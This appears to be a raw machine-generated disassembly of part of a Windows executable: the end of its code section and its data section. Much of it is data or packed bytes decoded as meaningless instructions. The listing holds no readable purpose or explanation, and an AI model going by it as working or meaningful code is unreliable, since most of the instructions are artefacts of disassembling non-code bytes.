  412a93:	xor    eax,0x8dd2535d
  412a98:	in     eax,0xf0
  412a9a:	pushf  
  412a9b:	xor    bl,dh
  412a9d:	sbb    eax,0x60d17c50
  412aa2:	or     DWORD PTR [eax],esp
  412aa4:	mov    al,ds:0xa5aca5b0
  412aa9:	and    eax,0x9b33b2e6
  412aae:	mov    ecx,esi
  412ab0:	dec    ebp
  412ab1:	cli    
  412ab2:	mov    dh,0x5b
  412ab4:	mov    cl,0x3a
  412ab6:	in     eax,0xb8
  412ab8:	mov    ah,0x55
  412aba:	mov    eax,0x2449345d
  412abf:	aaa    
  412ac0:	or     edx,esp
  412ac2:	in     al,dx
  412ac3:	adc    eax,0xb1874b8b
  412ac8:	xor    DWORD PTR [eax+0x7d2a57c4],edx
  412ace:	lods   al,BYTE PTR ds:[esi]
  412acf:	sbb    al,0xb3
  412ad1:	adc    al,ah
  412ad3:	in     al,0xb5
  412ad5:	mov    ds:0x9135df17,eax
  412ada:	ret    0xf874
  412add:	inc    esi
  412ade:	(bad)  
  412adf:	(bad)  
  412ae0:	icebp  
  412ae1:	mov    fs,WORD PTR [edi+ebp*2+0x2994d3b6]
  412ae8:	sub    DWORD PTR [ebx-0x7d0d9e8c],ebp
  412aee:	mov    bh,0xfe
  412af0:	push   ds
  412af1:	inc    ebp
  412af2:	cmc    
  412af3:	in     eax,0xd9
  412af5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412af6:	jns    0x412b25
  412af8:	push   ds
  412af9:	mov    BYTE PTR [edi],ch
  412afb:	ret    
  412afc:	fisttp WORD PTR [ecx+0x12]
  412aff:	jne    0x412ad6
  412b01:	test   DWORD PTR ds:0x4a7b3758,0x1cc545eb
  412b0b:	jl     0x412ae8
  412b0d:	xchg   edx,eax
  412b0e:	or     esp,DWORD PTR [edi+0x20dc06b9]
  412b14:	mov    cl,BYTE PTR [edx+0x2bb15647]
  412b1a:	pop    eax
  412b1b:	sbb    eax,0x4d7dc361
  412b20:	mov    cl,0x7f
  412b22:	dec    ebp
  412b23:	shl    DWORD PTR [ecx+0x8],cl
  412b26:	pop    ebx
  412b27:	out    dx,eax
  412b28:	hlt    
  412b29:	nop
  412b2a:	out    0xe7,al
  412b2c:	imul   esp,DWORD PTR [ebx],0xc08cc3ac
  412b32:	sub    esp,edx
  412b34:	or     dl,dh
  412b36:	lds    esp,FWORD PTR [ebp-0x59]
  412b39:	jne    0x412b46
  412b3b:	(bad)  
  412b3c:	xor    eax,0x3e47011a
  412b41:	je     0x412ac4
  412b43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b44:	out    dx,al
  412b45:	mov    dl,BYTE PTR [edi+0x95d893e]
  412b4b:	mov    bh,0x69
  412b4d:	mov    ah,0x50
  412b4f:	cld    
  412b50:	xchg   DWORD PTR [ecx+edx*1],edi
  412b53:	pop    es
  412b54:	or     al,0x62
  412b56:	add    bl,ah
  412b58:	imul   esp,DWORD PTR [esi+ebx*1+0x36],0xe9f93687
  412b60:	mov    ah,0x3e
  412b62:	popa   
  412b63:	scas   eax,DWORD PTR es:[edi]
  412b64:	add    eax,0x20923321
  412b69:	in     al,0x5d
  412b6b:	pop    ecx
  412b6c:	loopne 0x412af2
  412b6e:	or     al,0x3b
  412b70:	mov    bl,0xce
  412b72:	inc    ebx
  412b73:	pop    edx
  412b74:	addr16 ja 0x412b52
  412b77:	adc    eax,ebp
  412b79:	xlat   BYTE PTR ds:[ebx]
  412b7a:	jg     0x412bca
  412b7c:	arpl   WORD PTR [edx-0x39],bp
  412b7f:	into   
  412b80:	xor    DWORD PTR [edx],ebx
  412b82:	and    BYTE PTR [ecx+0x338641ef],dl
  412b88:	gs push edi
  412b8a:	adc    DWORD PTR es:[eax-0x3],edi
  412b8e:	mov    edx,0xe50c3d3e
  412b93:	pop    ss
  412b94:	sub    esp,ebx
  412b96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b97:	aam    0xe0
  412b99:	arpl   WORD PTR [edx-0x14624f9a],cx
  412b9f:	les    eax,FWORD PTR [ebp+0x47]
  412ba2:	xchg   ebx,eax
  412ba3:	xor    dh,BYTE PTR [ebx]
  412ba5:	sub    bh,BYTE PTR [ebx-0x60]
  412ba8:	xor    cl,BYTE PTR [ecx+0x525c33c9]
  412bae:	ret    
  412baf:	jo     0x412b57
  412bb1:	mov    DWORD PTR [ecx-0x2c],edi
  412bb4:	cli    
  412bb5:	nop
  412bb6:	aam    0xcc
  412bb8:	lods   eax,DWORD PTR ds:[esi]
  412bb9:	stc    
  412bba:	in     al,dx
  412bbb:	jecxz  0x412ba9
  412bbd:	xchg   edi,eax
  412bbe:	shr    DWORD PTR [ecx-0x77eb319f],0x35
  412bc5:	mov    al,ds:0x6652c5b2
  412bca:	pop    ds
  412bcb:	cli    
  412bcc:	mov    ebx,0x28985efc
  412bd1:	loop   0x412b8f
  412bd3:	jmp    DWORD PTR [edx+0x6d48f530]
  412bd9:	lds    esi,FWORD PTR [edi+esi*2-0x72]
  412bdd:	push   0x4
  412bdf:	pop    ebx
  412be0:	inc    ebx
  412be1:	xchg   ebx,ecx
  412be3:	sub    ebx,ecx
  412be5:	xchg   ebx,ecx
  412be7:	dec    ecx
  412be8:	mov    eax,DWORD PTR [ebp-0x1c]
  412beb:	imul   eax,ecx
  412bee:	add    esp,eax
  412bf0:	xchg   edx,eax
  412bf1:	push   eax
  412bf2:	xor    ebx,ebx
  412bf4:	mov    edx,esp
  412bf6:	dec    edx
  412bf7:	inc    ebx
  412bf8:	add    ebx,DWORD PTR [edx+ebx*1]
  412bfb:	dec    ebx
  412bfc:	xor    edx,edx
  412bfe:	add    DWORD PTR [ebp-0xc],ebx
  412c01:	pop    ebx
  412c02:	mov    eax,DWORD PTR [ebp-0xc]
  412c05:	pop    edi
  412c06:	pop    esi
  412c07:	pop    ebx
  412c08:	leave  
  412c09:	ret    0x10

Disassembly of section .data:

00413000 <.data>:
  413000:	xor    al,0x39
  413002:	add    DWORD PTR [eax],eax
  413004:	inc    edx
  413005:	cmp    DWORD PTR [ecx],eax
  413007:	add    BYTE PTR [ecx+edi*1+0x1],cl
  41300b:	add    BYTE PTR [ecx+edi*1+0x1],dl
  41300f:	add    BYTE PTR [esi+0x39],bl
  413012:	add    DWORD PTR [eax],eax
  413014:	push   0x39
  413016:	add    DWORD PTR [eax],eax
  413018:	jl     0x413053
  41301a:	add    DWORD PTR [eax],eax
  41301c:	xchg   BYTE PTR [ecx],bh
  41301e:	add    DWORD PTR [eax],eax
  413020:	xchg   esp,eax
  413021:	cmp    DWORD PTR [ecx],eax
  413023:	add    BYTE PTR [ecx+edi*1+0x39a80001],bl
  41302a:	add    DWORD PTR [eax],eax
  41302c:	mov    ah,0x39
  41302e:	add    DWORD PTR [eax],eax
  413030:	les    edi,FWORD PTR [ecx]
  413032:	add    DWORD PTR [eax],eax
  413034:	into   
  413035:	cmp    DWORD PTR [ecx],eax
  413037:	add    dh,dl
  413039:	cmp    DWORD PTR [ecx],eax
  41303b:	add    dl,ah
  41303d:	cmp    DWORD PTR [ecx],eax
  41303f:	add    dl,ch
  413041:	cmp    DWORD PTR [ecx],eax
  413043:	add    ah,dh
  413045:	cmp    DWORD PTR [ecx],eax
  413047:	add    ah,bh
  413049:	cmp    DWORD PTR [ecx],eax
  41304b:	add    BYTE PTR [eax],cl
  41304d:	cmp    al,BYTE PTR [ecx]
  41304f:	add    BYTE PTR [edx],dl
  413051:	cmp    al,BYTE PTR [ecx]
  413053:	add    BYTE PTR [edx],bl
  413055:	cmp    al,BYTE PTR [ecx]
  413057:	add    BYTE PTR [edx+edi*1],ah
  41305a:	add    DWORD PTR [eax],eax
  41305c:	xor    BYTE PTR [edx],bh
  41305e:	add    DWORD PTR [eax],eax
  413060:	cmp    bh,BYTE PTR [edx]
  413062:	add    DWORD PTR [eax],eax
  413064:	dec    eax
  413065:	cmp    al,BYTE PTR [ecx]
  413067:	add    BYTE PTR [edx+0x3a],dl
  41306a:	add    DWORD PTR [eax],eax
  41306c:	pop    esi
  41306d:	cmp    al,BYTE PTR [ecx]
  41306f:	add    BYTE PTR [edx+edi*1+0x1],ch
  413073:	add    BYTE PTR [edx+0x3a],bh
  413076:	add    DWORD PTR [eax],eax
  413078:	test   BYTE PTR [edx],bh
  41307a:	add    DWORD PTR [eax],eax
  41307c:	mov    ?,WORD PTR [edx]
  41307e:	add    DWORD PTR [eax],eax
  413080:	cwde   
  413081:	cmp    al,BYTE PTR [ecx]
  413083:	add    BYTE PTR [edx-0x55fffec6],ah
  413089:	cmp    al,BYTE PTR [ecx]
  41308b:	add    BYTE PTR [edx+edi*1+0x3abe0001],dh
  413092:	add    DWORD PTR [eax],eax
  413094:	enter  0x13a,0x0
  413098:	fdivr  QWORD PTR [edx]
  41309a:	add    DWORD PTR [eax],eax
  41309c:	out    0x3a,al
  41309e:	add    DWORD PTR [eax],eax
  4130a0:	repnz cmp al,BYTE PTR [ecx]
  4130a3:	add    dh,bh
  4130a5:	cmp    al,BYTE PTR [ecx]
  4130a7:	add    BYTE PTR [eax],cl
  4130a9:	cmp    eax,DWORD PTR [ecx]
  4130ab:	add    BYTE PTR [eax],bl
  4130ad:	cmp    eax,DWORD PTR [ecx]
  4130af:	add    BYTE PTR [eax],al
  4130b1:	add    BYTE PTR [eax],al
  4130b3:	add    BYTE PTR [esi],ch
  4130b5:	cmp    eax,DWORD PTR [ecx]
  4130b7:	add    BYTE PTR [edx+0x3b],al
  4130ba:	add    DWORD PTR [eax],eax
  4130bc:	pop    eax
  4130bd:	cmp    eax,DWORD PTR [ecx]
  4130bf:	add    BYTE PTR [eax+0x3b],ch
  4130c2:	add    DWORD PTR [eax],eax
  4130c4:	je     0x413101
  4130c6:	add    DWORD PTR [eax],eax
  4130c8:	nop
  4130c9:	cmp    eax,DWORD PTR [ecx]
  4130cb:	add    BYTE PTR [ebx+edi*1+0x3bb40001],bl
  4130d2:	add    DWORD PTR [eax],eax
  4130d4:	int3   
  4130d5:	cmp    eax,DWORD PTR [ecx]
  4130d7:	add    dl,bl
  4130d9:	cmp    eax,DWORD PTR [ecx]
  4130db:	add    dh,ah
  4130dd:	cmp    eax,DWORD PTR [ecx]
  4130df:	add    al,bh
  4130e1:	cmp    eax,DWORD PTR [ecx]
  4130e3:	add    BYTE PTR [esp+edi*1],cl
  4130e6:	add    DWORD PTR [eax],eax
  4130e8:	sbb    bh,BYTE PTR [ecx+eax*1]
  4130eb:	add    BYTE PTR [edx],ch
  4130ed:	cmp    al,0x1
  4130ef:	add    BYTE PTR [edx],bh
  4130f1:	cmp    al,0x1
  4130f3:	add    BYTE PTR [esi+0x3c],cl
  4130f6:	add    DWORD PTR [eax],eax
  4130f8:	pop    edx
  4130f9:	cmp    al,0x1
  4130fb:	add    BYTE PTR [edx+0x3c],ch
  4130fe:	add    DWORD PTR [eax],eax
  413100:	js     0x41313e
  413102:	add    DWORD PTR [eax],eax
  413104:	xchg   edx,eax
  413105:	cmp    al,0x1
  413107:	add    BYTE PTR [esp+edi*1+0x3cb20001],ah
  41310e:	add    DWORD PTR [eax],eax
  413110:	ret    0x13c
  413113:	add    ah,dl
  413115:	cmp    al,0x1
  413117:	add    dh,ah
  413119:	cmp    al,0x1
  41311b:	add    ah,dh
  41311d:	cmp    al,0x1
  41311f:	add    dh,bh
  413121:	cmp    al,0x1
  413123:	add    BYTE PTR [esi],cl
  413125:	cmp    eax,0x3d1e0001
  41312a:	add    DWORD PTR [eax],eax
  41312c:	sub    al,0x3d
  41312e:	add    DWORD PTR [eax],eax
  413130:	cmp    bh,BYTE PTR ds:0x3d4c0001
  413136:	add    DWORD PTR [eax],eax
  413138:	pop    eax
  413139:	cmp    eax,0x3d6e0001
  41313e:	add    DWORD PTR [eax],eax
  413140:	cmp    BYTE PTR ds:0x3d920001,0x1
  413147:	add    BYTE PTR [esi-0x45fffec3],ah
  41314d:	cmp    eax,0x3dce0001
  413152:	add    DWORD PTR [eax],eax
  413154:	jmp    0x13d:0xf800013d
  41315b:	add    BYTE PTR [esi],al
  41315d:	add    DWORD PTR ds:[eax],eax
  413160:	sbb    al,0x3e
  413162:	add    DWORD PTR [eax],eax
  413164:	sub    bh,BYTE PTR [esi]
  413166:	add    DWORD PTR [eax],eax
  413168:	cmp    al,0x3e
  41316a:	add    DWORD PTR [eax],eax
  41316c:	dec    eax
  41316d:	add    DWORD PTR ds:[eax],eax
  413170:	pop    esp
  413171:	add    DWORD PTR ds:[eax],eax
  413174:	ins    BYTE PTR es:[edi],dx
  413175:	add    DWORD PTR ds:[eax],eax
  413178:	jl     0x4131b8
  41317a:	add    DWORD PTR [eax],eax
  41317c:	mov    BYTE PTR [esi],bh
  41317e:	add    DWORD PTR [eax],eax
  413180:	cwde   
  413181:	add    DWORD PTR ds:[eax],eax
  413184:	lods   al,BYTE PTR ds:[esi]
  413185:	add    DWORD PTR ds:[eax],eax
  413188:	mov    edx,0xcc00013e
  41318d:	add    DWORD PTR ds:[eax],eax
  413190:	fidivr DWORD PTR [esi]
  413192:	add    DWORD PTR [eax],eax
  413194:	lock add DWORD PTR ds:[eax],eax
  413198:	(bad)  
  413199:	add    DWORD PTR ds:[eax],eax
  41319c:	push   cs
  41319d:	aas    
  41319e:	add    DWORD PTR [eax],eax
  4131a0:	sbb    bh,BYTE PTR [edi]
  4131a2:	add    DWORD PTR [eax],eax
  4131a4:	sub    bh,BYTE PTR [edi]
  4131a6:	add    DWORD PTR [eax],eax
  4131a8:	cmp    BYTE PTR [edi],bh
  4131aa:	add    DWORD PTR [eax],eax
  4131ac:	dec    esi
  4131ad:	aas    
  4131ae:	add    DWORD PTR [eax],eax
  4131b0:	bound  edi,QWORD PTR [edi]
  4131b2:	add    DWORD PTR [eax],eax
  4131b4:	outs   dx,BYTE PTR ds:[esi]
  4131b5:	aas    
  4131b6:	add    DWORD PTR [eax],eax
  4131b8:	js     0x4131f9
  4131ba:	add    DWORD PTR [eax],eax
  4131bc:	xchg   BYTE PTR [edi],bh
  4131be:	add    DWORD PTR [eax],eax
  4131c0:	xchg   esp,eax
  4131c1:	aas    
  4131c2:	add    DWORD PTR [eax],eax
  4131c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4131c5:	aas    
  4131c6:	add    DWORD PTR [eax],eax
  4131c8:	mov    dh,0x3f
  4131ca:	add    DWORD PTR [eax],eax
  4131cc:	enter  0x13f,0x0
  4131d0:	fidivr DWORD PTR [edi]
  4131d2:	add    DWORD PTR [eax],eax
  4131d4:	in     al,dx
  4131d5:	aas    
  4131d6:	add    DWORD PTR [eax],eax
  4131d8:	clc    
  4131d9:	aas    
  4131da:	add    DWORD PTR [eax],eax
  4131dc:	or     al,BYTE PTR [eax+0x1]
  4131df:	add    BYTE PTR [edx],ah
  4131e1:	inc    eax
  4131e2:	add    DWORD PTR [eax],eax
  4131e4:	xor    al,0x40
  4131e6:	add    DWORD PTR [eax],eax
  4131e8:	dec    eax
  4131e9:	inc    eax
  4131ea:	add    DWORD PTR [eax],eax
  4131ec:	pop    edx
  4131ed:	inc    eax
  4131ee:	add    DWORD PTR [eax],eax
  4131f0:	fs inc eax
  4131f2:	add    DWORD PTR [eax],eax
  4131f4:	je     0x413236
  4131f6:	add    DWORD PTR [eax],eax
  4131f8:	add    BYTE PTR [eax+0x1],0x0
  4131fc:	cwde   
  4131fd:	inc    eax
  4131fe:	add    DWORD PTR [eax],eax
  413200:	lods   al,BYTE PTR ds:[esi]
  413201:	inc    eax
  413202:	add    DWORD PTR [eax],eax
  413204:	mov    esp,0xca000140
  413209:	inc    eax
  41320a:	add    DWORD PTR [eax],eax
  41320c:	loopne 0x41324e
  41320e:	add    DWORD PTR [eax],eax
  413210:	lock inc eax
  413212:	add    DWORD PTR [eax],eax
  413214:	or     BYTE PTR [ecx+0x1],al
  413217:	add    BYTE PTR [esi],dl
  413219:	inc    ecx
  41321a:	add    DWORD PTR [eax],eax
  41321c:	sub    BYTE PTR [ecx+0x1],al
  41321f:	add    BYTE PTR [esi],dh
  413221:	inc    ecx
  413222:	add    DWORD PTR [eax],eax
  413224:	inc    esp
  413225:	inc    ecx
  413226:	add    DWORD PTR [eax],eax
  413228:	push   edx
  413229:	inc    ecx
  41322a:	add    DWORD PTR [eax],eax
  41322c:	pusha  
  41322d:	inc    ecx
  41322e:	add    DWORD PTR [eax],eax
  413230:	jo     0x413273
  413232:	add    DWORD PTR [eax],eax
  413234:	test   BYTE PTR [ecx+0x1],al
  413237:	add    BYTE PTR [edx-0x5ffffebf],dl
  41323d:	inc    ecx
  41323e:	add    DWORD PTR [eax],eax
  413240:	scas   al,BYTE PTR es:[edi]
  413241:	inc    ecx
  413242:	add    DWORD PTR [eax],eax
  413244:	mov    esi,0xd6000141
  413249:	inc    ecx
  41324a:	add    DWORD PTR [eax],eax
  41324c:	call   0xfa413392
  413251:	inc    ecx
  413252:	add    DWORD PTR [eax],eax
  413254:	push   es
  413255:	inc    edx
  413256:	add    DWORD PTR [eax],eax
  413258:	sbb    BYTE PTR [edx+0x1],al
  41325b:	add    BYTE PTR [esi],ch
  41325d:	inc    edx
  41325e:	add    DWORD PTR [eax],eax
  413260:	cmp    al,BYTE PTR [edx+0x1]
  413263:	add    BYTE PTR [esi+0x42],cl
  413266:	add    DWORD PTR [eax],eax
  413268:	pusha  
  413269:	inc    edx
  41326a:	add    DWORD PTR [eax],eax
  41326c:	add    BYTE PTR [eax],al
  41326e:	add    BYTE PTR [eax],al
  413270:	add    BYTE PTR [edx+0x1],0x0
  413274:	cwde   
  413275:	inc    edx
  413276:	add    DWORD PTR [eax],eax
  413278:	scas   al,BYTE PTR es:[edi]
  413279:	inc    edx
  41327a:	add    DWORD PTR [eax],eax
  41327c:	mov    edx,0xca000142
  413281:	inc    edx
  413282:	add    DWORD PTR [eax],eax
  413284:	fadd   QWORD PTR [edx+0x1]
  413287:	add    ah,ch
  413289:	inc    edx
  41328a:	add    DWORD PTR [eax],eax
  41328c:	clc    
  41328d:	inc    edx
  41328e:	add    DWORD PTR [eax],eax
  413290:	push   cs
  413291:	inc    ebx
  413292:	add    DWORD PTR [eax],eax
  413294:	sbb    BYTE PTR [ebx+0x1],al
  413297:	add    BYTE PTR [ebx+eax*2],ah
  41329a:	add    DWORD PTR [eax],eax
  41329c:	xor    al,BYTE PTR [ebx+0x1]
  41329f:	add    BYTE PTR [edx+0x43],al
  4132a2:	add    DWORD PTR [eax],eax
  4132a4:	push   eax
  4132a5:	inc    ebx
  4132a6:	add    DWORD PTR [eax],eax
  4132a8:	pop    edx
  4132a9:	inc    ebx
  4132aa:	add    DWORD PTR [eax],eax
  4132ac:	outs   dx,BYTE PTR ds:[esi]
  4132ad:	inc    ebx
  4132ae:	add    DWORD PTR [eax],eax
  4132b0:	test   BYTE PTR [ebx+0x1],al
  4132b3:	add    BYTE PTR [ebx+eax*2+0x43a40001],dl
  4132ba:	add    DWORD PTR [eax],eax
  4132bc:	mov    eax,0xcc000143
  4132c1:	inc    ebx
  4132c2:	add    DWORD PTR [eax],eax
  4132c4:	fiadd  DWORD PTR [ebx+0x1]
  4132c7:	add    dl,ch
  4132c9:	inc    ebx
  4132ca:	add    DWORD PTR [eax],eax
  4132cc:	clc    
  4132cd:	inc    ebx
  4132ce:	add    DWORD PTR [eax],eax
  4132d0:	or     BYTE PTR [ecx+eax*1+0x0],al
  4132d4:	adc    al,0x44
  4132d6:	add    DWORD PTR [eax],eax
  4132d8:	and    BYTE PTR [ecx+eax*1+0x0],al
  4132dc:	xor    al,0x44
  4132de:	add    DWORD PTR [eax],eax
  4132e0:	inc    esi
  4132e1:	inc    esp
  4132e2:	add    DWORD PTR [eax],eax
  4132e4:	pop    edx
  4132e5:	inc    esp
  4132e6:	add    DWORD PTR [eax],eax
  4132e8:	inc    sp
  4132ea:	add    DWORD PTR [eax],eax
  4132ec:	jbe    0x413332
  4132ee:	add    DWORD PTR [eax],eax
  4132f0:	mov    es,WORD PTR [ecx+eax*1+0x0]
  4132f4:	sahf   
  4132f5:	inc    esp
  4132f6:	add    DWORD PTR [eax],eax
  4132f8:	scas   al,BYTE PTR es:[edi]
  4132f9:	inc    esp
  4132fa:	add    DWORD PTR [eax],eax
  4132fc:	mov    BYTE PTR [ecx+eax*1+0x0],0xd0
  413301:	inc    esp
  413302:	add    DWORD PTR [eax],eax
  413304:	in     al,dx
  413305:	inc    esp
  413306:	add    DWORD PTR [eax],eax
  413308:	clc    
  413309:	inc    esp
  41330a:	add    DWORD PTR [eax],eax
  41330c:	or     al,BYTE PTR [ebp+0x1]
  41330f:	add    BYTE PTR [esi],bl
  413311:	inc    ebp
  413312:	add    DWORD PTR [eax],eax
  413314:	sub    BYTE PTR [ebp+0x1],al
  413317:	add    BYTE PTR [eax],bh
  413319:	inc    ebp
  41331a:	add    DWORD PTR [eax],eax
  41331c:	inc    esp
  41331d:	inc    ebp
  41331e:	add    DWORD PTR [eax],eax
  413320:	dec    esi
  413321:	inc    ebp
  413322:	add    DWORD PTR [eax],eax
  413324:	pop    edx
  413325:	inc    ebp
  413326:	add    DWORD PTR [eax],eax
  413328:	add    BYTE PTR [eax],al
  41332a:	add    BYTE PTR [eax],al
  41332c:	jbe    0x413373
  41332e:	add    DWORD PTR [eax],eax
  413330:	mov    BYTE PTR [ebp+0x1],al
  413333:	add    BYTE PTR [eax-0x51fffebb],ah
  413339:	inc    ebp
  41333a:	add    DWORD PTR [eax],eax
  41333c:	retf   0x145
  41333f:	add    ah,bl
  413341:	inc    ebp
  413342:	add    DWORD PTR [eax],eax
  413344:	in     al,dx
  413345:	inc    ebp
  413346:	add    DWORD PTR [eax],eax
  413348:	add    BYTE PTR [esi+0x1],al
  41334b:	add    BYTE PTR [eax],bl
  41334d:	inc    esi
  41334e:	add    DWORD PTR [eax],eax
  413350:	sub    al,BYTE PTR [esi+0x1]
  413353:	add    BYTE PTR [esi],dh
  413355:	inc    esi
  413356:	add    DWORD PTR [eax],eax
  413358:	dec    edx
  413359:	inc    esi
  41335a:	add    DWORD PTR [eax],eax
  41335c:	pusha  
  41335d:	inc    esi
  41335e:	add    DWORD PTR [eax],eax
  413360:	ins    BYTE PTR es:[edi],dx
  413361:	inc    esi
  413362:	add    DWORD PTR [eax],eax
  413364:	add    BYTE PTR [esi+0x1],0x0
  413368:	xchg   esp,eax
  413369:	inc    esi
  41336a:	add    DWORD PTR [eax],eax
  41336c:	mov    al,ds:0xae000146
  413371:	inc    esi
  413372:	add    DWORD PTR [eax],eax
  413374:	ret    0x146
  413377:	add    dl,bl
  413379:	inc    esi
  41337a:	add    DWORD PTR [eax],eax
  41337c:	call   0xf24134c7
  413381:	inc    esi
  413382:	add    DWORD PTR [eax],eax
  413384:	inc    BYTE PTR [esi+0x1]
  413387:	add    BYTE PTR [esi],cl
  413389:	inc    edi
  41338a:	add    DWORD PTR [eax],eax
  41338c:	and    al,0x47
  41338e:	add    DWORD PTR [eax],eax
  413390:	cmp    al,BYTE PTR [edi+0x1]
  413393:	add    BYTE PTR [edi+eax*2+0x1],cl
  413397:	add    BYTE PTR [edx+0x47],bl
  41339a:	add    DWORD PTR [eax],eax
  41339c:	push   0x47
  41339e:	add    DWORD PTR [eax],eax
  4133a0:	jle    0x4133e9
  4133a2:	add    DWORD PTR [eax],eax
  4133a4:	xchg   esi,eax
  4133a5:	inc    edi
  4133a6:	add    DWORD PTR [eax],eax
  4133a8:	mov    ds:0xba000147,al
  4133ad:	inc    edi
  4133ae:	add    DWORD PTR [eax],eax
  4133b0:	int3   
  4133b1:	inc    edi
  4133b2:	add    DWORD PTR [eax],eax
  4133b4:	fadd   QWORD PTR [edi+0x1]
  4133b7:	add    al,dh
  4133b9:	inc    edi
  4133ba:	add    DWORD PTR [eax],eax
  4133bc:	push   es
  4133bd:	dec    eax
  4133be:	add    DWORD PTR [eax],eax
  4133c0:	sbb    cl,BYTE PTR [eax+0x1]
  4133c3:	add    BYTE PTR [eax],ch
  4133c5:	dec    eax
  4133c6:	add    DWORD PTR [eax],eax
  4133c8:	cmp    cl,BYTE PTR [eax+0x1]
  4133cb:	add    BYTE PTR [eax+0x48],cl
  4133ce:	add    DWORD PTR [eax],eax
  4133d0:	push   esp
  4133d1:	dec    eax
  4133d2:	add    DWORD PTR [eax],eax
  4133d4:	outs   dx,BYTE PTR ds:[esi]
  4133d5:	dec    eax
  4133d6:	add    DWORD PTR [eax],eax
  4133d8:	mov    BYTE PTR [eax+0x1],cl
  4133db:	add    BYTE PTR [eax-0x59fffeb8],bl
  4133e1:	dec    eax
  4133e2:	add    DWORD PTR [eax],eax
  4133e4:	mov    dl,0x48
  4133e6:	add    DWORD PTR [eax],eax
  4133e8:	ror    BYTE PTR [eax+0x1],0x0
  4133ec:	(bad)  
  4133ed:	dec    eax
  4133ee:	add    DWORD PTR [eax],eax
  4133f0:	add    BYTE PTR [eax],al
  4133f2:	add    BYTE PTR [eax],al
  4133f4:	lock dec eax
  4133f6:	add    DWORD PTR [eax],eax
  4133f8:	dec    BYTE PTR [eax+0x1]
  4133fb:	add    BYTE PTR [esi],cl
  4133fd:	dec    ecx
  4133fe:	add    DWORD PTR [eax],eax
  413400:	push   ds
  413401:	dec    ecx
  413402:	add    DWORD PTR [eax],eax
  413404:	cs dec ecx
  413406:	add    DWORD PTR [eax],eax
  413408:	add    BYTE PTR [eax],al
  41340a:	add    BYTE PTR [eax],al
  41340c:	push   eax
  41340d:	dec    ecx
  41340e:	add    DWORD PTR [eax],eax
	...
  413418:	stos   DWORD PTR es:[edi],eax
  413419:	inc    ebx
  41341a:	push   ebp
  41341b:	dec    ebp
  41341c:	add    BYTE PTR [eax],al
  41341e:	add    BYTE PTR [eax],al
  413420:	add    al,BYTE PTR [eax]
  413422:	add    BYTE PTR [eax],al
  413424:	cmp    eax,0xc3000000
  413429:	dec    ecx
  41342a:	add    eax,DWORD PTR [eax]
  41342c:	ret    
  41342d:	cmp    eax,DWORD PTR [ebx]
	...
  413437:	add    BYTE PTR [ebx+0x4d5543],ch
  41343d:	add    BYTE PTR [eax],al
  41343f:	add    BYTE PTR [esi+0x34],ah
  413442:	add    DWORD PTR [eax],eax
  413444:	add    DWORD PTR [eax],eax
  413446:	add    BYTE PTR [eax],al
  413448:	add    DWORD PTR [eax],eax
  41344a:	add    BYTE PTR [eax],al
  41344c:	add    DWORD PTR [eax],eax
  41344e:	add    BYTE PTR [eax],al
  413450:	pop    esp
  413451:	xor    al,0x1
  413453:	add    BYTE PTR [eax+0x34],ah
  413456:	add    DWORD PTR [eax],eax
  413458:	fs xor al,0x1
  41345b:	add    ch,cl
  41345d:	sub    BYTE PTR [eax],al
  41345f:	add    BYTE PTR [edi+0x34],dh
  413462:	add    DWORD PTR [eax],eax
  413464:	add    BYTE PTR [eax],al
  413466:	jb     0x4134d5
  413468:	ins    DWORD PTR es:[edi],dx
  413469:	pop    ecx
  41346a:	dec    eax
  41346b:	outs   dx,DWORD PTR ds:[esi]
  41346c:	imul   ecx,DWORD PTR [eax+0x6c],0x68
  413470:	ja     0x4134e1
  413472:	imul   ebp,DWORD PTR cs:[esi+0x73],0x69483f00
  41347a:	fs gs dec ebx
  41347d:	gs jns 0x4134e2
  413480:	outs   dx,DWORD PTR ds:[esi]
  413481:	popa   
  413482:	jb     0x4134e8
  413484:	dec    esi
  413485:	gs ja  0x4134c8
  413488:	inc    eax
  413489:	pop    ecx
  41348a:	inc    edi
  41348b:	pop    eax
  41348c:	inc    esp
  41348d:	cmp    al,0x56
  41348f:	add    BYTE PTR [eax],al
  413491:	add    BYTE PTR [eax],al
  413493:	add    BYTE PTR [eax],ah
  413495:	xor    eax,0x1
  41349a:	add    BYTE PTR [eax],al
  41349c:	add    BYTE PTR [eax],al
  41349e:	add    BYTE PTR [eax],al
  4134a0:	and    bh,BYTE PTR [ebx]
  4134a2:	add    DWORD PTR [eax],eax
  4134a4:	add    BYTE PTR [eax],dh
  4134a6:	add    DWORD PTR [eax],eax
  4134a8:	aam    0x35
  4134aa:	add    DWORD PTR [eax],eax
	...
  4134b4:	je     0x4134f8
  4134b6:	add    DWORD PTR [eax],eax
  4134b8:	mov    ah,0x30
  4134ba:	add    DWORD PTR [eax],eax
  4134bc:	nop
  4134bd:	aaa    
  4134be:	add    DWORD PTR [eax],eax
	...
  4134c8:	ins    BYTE PTR es:[edi],dx
  4134c9:	inc    ebp
  4134ca:	add    DWORD PTR [eax],eax
  4134cc:	jo     0x413500
  4134ce:	add    DWORD PTR [eax],eax
  4134d0:	dec    esp
  4134d1:	cmp    BYTE PTR [ecx],al
	...
  4134db:	add    dl,ah
  4134dd:	dec    eax
  4134de:	add    DWORD PTR [eax],eax
  4134e0:	sub    al,0x33
  4134e2:	add    DWORD PTR [eax],eax
  4134e4:	adc    al,0x39
  4134e6:	add    DWORD PTR [eax],eax
	...
  4134f0:	inc    edx
  4134f1:	dec    ecx
  4134f2:	add    DWORD PTR [eax],eax
  4134f4:	hlt    
  4134f5:	xor    eax,DWORD PTR [ecx]
  4134f7:	add    BYTE PTR [ecx+edi*1],ch
  4134fa:	add    DWORD PTR [eax],eax
	...
  413504:	bound  ecx,QWORD PTR [ecx+0x1]
  413507:	add    BYTE PTR [esp+esi*1],cl
  41350a:	add    DWORD PTR [eax],eax
	...
  413520:	xor    al,0x39
  413522:	add    DWORD PTR [eax],eax
  413524:	inc    edx
  413525:	cmp    DWORD PTR [ecx],eax
  413527:	add    BYTE PTR [ecx+edi*1+0x1],cl
  41352b:	add    BYTE PTR [ecx+edi*1+0x1],dl
  41352f:	add    BYTE PTR [esi+0x39],bl
  413532:	add    DWORD PTR [eax],eax
  413534:	push   0x39
  413536:	add    DWORD PTR [eax],eax
  413538:	jl     0x413573
